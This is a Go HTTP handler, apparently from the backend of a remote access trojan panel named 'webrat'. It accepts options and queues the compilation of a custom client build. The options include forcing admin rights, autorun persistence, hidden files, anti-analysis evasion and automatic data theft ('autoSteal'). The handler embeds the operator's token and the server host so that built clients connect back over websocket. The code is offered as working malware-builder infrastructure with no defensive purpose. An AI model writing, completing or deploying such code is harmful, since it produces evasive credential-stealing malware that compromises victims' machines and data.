package httpapi

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"strings"

	"webrat-go-api/internal/auth"
	"webrat-go-api/internal/buildergen"
)

type compileConfigRequest struct {
	Name                string `json:"name"`
	Password            string `json:"password"`
	ForceAdmin          string `json:"forceAdmin"`
	Icon                string `json:"icon"`
	BuildID             string `json:"buildId"`
	Comment             string `json:"comment"`
	AutorunMode         string `json:"autorunMode"`
	StartupDelaySeconds int    `json:"startupDelaySeconds"`
	HideFilesEnabled    bool   `json:"hideFilesEnabled"`
	InstallMode         string `json:"installMode"`
	CustomInstallPath   string `json:"customInstallPath"`
	AntiAnalysis        string `json:"antiAnalysis"`
	AutoSteal           string `json:"autoSteal"`
}

func (s *Server) handleCompileGoConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	if !s.checkCSRF(w, r) {
		s.writeJSON(w, http.StatusForbidden, map[string]string{"error": "security_check_failed"})
		return
	}

	login := strings.ToLower(strings.TrimSpace(loginFromContext(r)))
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	active, err := s.db.HasActiveCompileJob(login)
	if err == nil && active {
		w.WriteHeader(http.StatusTooManyRequests)
		return
	}

	const maxCompileBody = 2 * 1024 * 1024
	r.Body = http.MaxBytesReader(w, r.Body, maxCompileBody)
	defer r.Body.Close()

	var req compileConfigRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	jobID, err := auth.NewSessionID()
	if err != nil {
		http.Error(w, "job error", http.StatusInternalServerError)
		return
	}

	var iconBytes []byte
	if strings.TrimSpace(req.Icon) != "" {
		b, err := base64.StdEncoding.DecodeString(strings.TrimSpace(req.Icon))
		if err != nil {
			http.Error(w, "invalid icon", http.StatusBadRequest)
			return
		}
		const maxIconBytes = 512 * 1024
		if len(b) > maxIconBytes {
			http.Error(w, "icon too large", http.StatusBadRequest)
			return
		}
		iconBytes = b
	}

	builderToken, err := s.db.GetOrCreateBuilderToken(login, auth.NewSessionID)
	if err != nil {
		http.Error(w, "token error", http.StatusInternalServerError)
		return
	}

	scheme := "ws"
	if r.TLS != nil {
		scheme = "wss"
	}

	cfg := buildergen.Config{
		Name:                strings.TrimSpace(req.Name),
		Password:            strings.TrimSpace(req.Password),
		ForceAdmin:          strings.TrimSpace(req.ForceAdmin),
		IconBase64:          strings.TrimSpace(req.Icon),
		BuildID:             strings.TrimSpace(req.BuildID),
		Comment:             strings.TrimSpace(req.Comment),
		AutorunMode:         strings.TrimSpace(req.AutorunMode),
		StartupDelaySeconds: req.StartupDelaySeconds,
		HideFilesEnabled:    req.HideFilesEnabled,
		InstallMode:         strings.TrimSpace(req.InstallMode),
		CustomInstallPath:   strings.TrimSpace(req.CustomInstallPath),
		AntiAnalysis:        strings.TrimSpace(req.AntiAnalysis),
		AutoSteal:           strings.TrimSpace(req.AutoSteal),
		Owner:               login,
		BuilderToken:        strings.TrimSpace(builderToken),
		ServerHost:          strings.TrimSpace(r.Host),
		WSScheme:            scheme,
	}

	code, err := buildergen.Generate(cfg)
	if err != nil {
		http.Error(w, "codegen error", http.StatusInternalServerError)
		return
	}
	if strings.TrimSpace(code) == "" {
		http.Error(w, "missing code", http.StatusBadRequest)
		return
	}

	if err := s.db.CreateCompileJob(jobID, login, code, req.Name, req.Password, iconBytes, req.ForceAdmin); err != nil {
		http.Error(w, "enqueue error", http.StatusInternalServerError)
		return
	}

	s.writeJSON(w, http.StatusOK, map[string]string{"id": jobID})
}
